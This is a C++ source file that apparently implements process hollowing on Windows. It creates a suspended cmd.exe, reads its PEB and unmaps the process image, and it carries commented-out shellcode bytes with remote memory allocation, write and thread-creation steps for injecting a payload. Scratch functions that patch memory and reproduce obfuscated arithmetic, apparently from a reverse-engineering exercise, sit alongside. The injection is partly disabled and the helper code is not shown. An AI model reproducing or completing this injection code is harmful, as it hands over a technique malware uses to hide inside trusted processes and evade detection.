#include <windows.h>
#include <memory>
#include <iostream>
#include "safeHandle.h"
#include "utils.h"

UINT processHollow();
int bla1(void* password);
UINT bla2(char a1, int a2, char pass);

int main() {
	processHollow();
	/*DWORD a = GetTickCount();
	system("pause");
	auto b = a < GetTickCount();
	std::cout << b << std::endl;
	std::cout << GetTickCount() << std::endl;
	std::cout << GetTickCount() << std::endl;

	DWORD ticks = GetTickCount64();
	DWORD milliseconds = ticks % 1000;
	ticks /= 1000;
	DWORD seconds = ticks % 60;
	ticks /= 60;
	DWORD minutes = ticks % 60;
	ticks /= 60;
	DWORD hours = ticks; // may exceed 24 hours.
	printf("%d:%02d:%02d.%03d\n", hours, minutes, seconds, milliseconds);*/
	
	//__debugbreak();
	//char password = 0;
	//int a = scanf("%s", &password);
	//int res = bla1(&password);

	system("pause");
	return EXIT_SUCCESS;
}

int bla1(void* password) {
	void* v22 = password;
	DWORD oldProtect = NULL;
	//if (!VirtualProtect(*bla2, 0xC8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
	//	std::cout << "Failed change mem" << std::endl;
	//	return 1;
	//}
	//std::cout << GetLastError() << std::endl;

	//char g = 'a';
	//std::cout << bla2 << *bla2<< std::endl;
	//printf("%p, %p" , bla2 , &(*bla2));
	//std::cin >> g;
	UINT res = bla2(11 < 11, 0, (char)&v22);
	return 0;
}

UINT bla2(char a1,int a2,char a3) {
	std::cout << "a1" << a1 << std::endl;
	std::cout << "a2" << a2 << std::endl;
	std::cout << "a3" << a3 << std::endl;
	UINT result = (a2 - (a1 + 572615656) + 1) ^ 0xFD950c6B;
	//std::cout << (BYTE*)(result + 85) << std::endl;
	//*(BYTE*)(result + 85) = a3;
	//*(DWORD*)(result + 30) = result;
	std::cout << result << std::endl;
	return result;
}

UINT processHollow() { 
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	DWORD64 pebAddr = 0;
	//BYTE shellcode[25] = { 0x45,0x33,0xC9,0x4C,0x8D,0x05,0xAB,0xCD,0x00,0x00,0x48,0x8D,0x15,0xB4,0xCD,0x00,0x00,0x33,0xC9,0xFF,0x15,0x54,0x54,0x01,0x00 };
	LPSTR file = (char*)"C:\\Windows\\System32\\cmd.exe";
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(NULL, file, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		Utils::Error("Failed create process");
	}

	auto safeHandle = std::make_unique<SafeHanldle>(pi.hProcess, pi.hThread);

	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!Utils::getContext(safeHandle.get()->getThread(), ctx)) {
		Utils::Error("Failed get context");
	}

	pebAddr = ctx.Rdx;
	std::optional<LPVOID> optionalImageBaseAddr = Utils::readProcessMemory(safeHandle.get()->getProcess(), pebAddr);
	if (!optionalImageBaseAddr) {
		return EXIT_FAILURE;
	}

	LPVOID imageBaseAddr = optionalImageBaseAddr.value();
	if (Utils::unmapProcess(ntdll, safeHandle.get()->getProcess(), imageBaseAddr) == EXIT_FAILURE) {
		return EXIT_FAILURE;
	}
	/*LPVOID address = VirtualAllocEx(safeHandle.get()->getProcess(), NULL, SIZE_OF_SHELLCODE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!address) {
		Utils::Error("Failed allocate memory");
	}

	if (!WriteProcessMemory(safeHandle.get()->getProcess(), address, shellcode, SIZE_OF_SHELLCODE, NULL)) {
		Utils::Error("Failed write process memory");
	}

	HANDLE remoteThreadHandle = CreateRemoteThread(safeHandle.get()->getProcess(), NULL, NULL, address);
	if (!ResumeThread(safeHandle.get()->getThread())) {
		Utils::Error("Failed resume process thread");
	}*/
	return 0;
}